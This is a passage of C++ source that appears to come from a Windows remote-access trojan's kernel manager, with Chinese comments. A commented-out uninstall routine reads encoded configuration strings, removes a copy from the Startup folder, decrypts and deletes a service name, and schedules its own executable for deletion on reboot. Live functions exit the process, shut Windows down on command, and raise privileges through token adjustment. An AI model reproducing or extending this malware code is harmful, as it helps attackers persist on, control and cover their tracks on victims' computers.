	//
	//char	*szInstall = (char *)FindConfigString(CKernelManager::g_hInstance, "OPQR");
	//if (szInstall == NULL)
	//{
	//	return;
	//}

	//char	*szGreen = (char *)FindConfigString(CKernelManager::g_hInstance, "STUV");
	//if (szGreen == NULL)
	//{
	//	return;
	//}
	//
	//if(strstr(szGreen, "K") != NULL)//如果不是绿色安装
	//{
	//	if (strstr(szInstall, "U") != NULL)
	//	{
	//		TCHAR   szPath[MAX_PATH];
	//		SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
	//		TCHAR buf3[MAX_PATH];
	//		char FileName[80];
	//		wsprintf(FileName,"%s.exe",szGetGroup);
	//		wsprintf(buf3, "%s\\%s", szPath, FileName);
	//		
	//		char	strTmpPathQ[MAX_PATH];
	//		char	strRandomFileQ[MAX_PATH];
	//		GetTempPath(sizeof(strTmpPathQ), strTmpPathQ);
	//		wsprintf(strRandomFileQ, "%s\\%x.sg", strTmpPathQ, GetTickCount()+57);
	//		MoveFile(buf3, strRandomFileQ);
	//		MoveFileEx(strRandomFileQ, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	//	}
	//	if (strstr(szInstall, "I") != NULL)
	//	{
	//		char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
	//		if (SerName == NULL)
	//		{
	//			return;
	//		}
	//		SerName = (char *)(MyDecode(SerName + 4));  //解密被加密的字符串
	//		//删除服务
	//		char	*ServerA = NULL;
	//		ServerA = SerName;
	//		SC_HANDLE service, scm;
	//		scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
	//		service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
	//		DeleteService(service);
	//	}
	//}

	//CHAR	strServiceDll[MAX_PATH];
	//GetModuleFileName(NULL, strServiceDll, sizeof(strServiceDll));
	//char	strTmpPath[MAX_PATH];
	//char	strRandomFile[MAX_PATH];
	//GetTempPath(sizeof(strTmpPath), strTmpPath);
	//wsprintf(strRandomFile, "%s\\%x.log", strTmpPath, GetTickCount()+357);
	//MoveFile(strServiceDll, strRandomFile);
	//MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	//DelSetInfo(szGetGroup, szGroup, "BITS");//写分组信息
	//CreateEvent(NULL, true, false, m_strKillEvent);
	exit(0);
	ExitProcess(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

void CKernelManager::ShutdownWindows(DWORD dwReason)
{
	EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
}

BOOL CKernelManager::EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
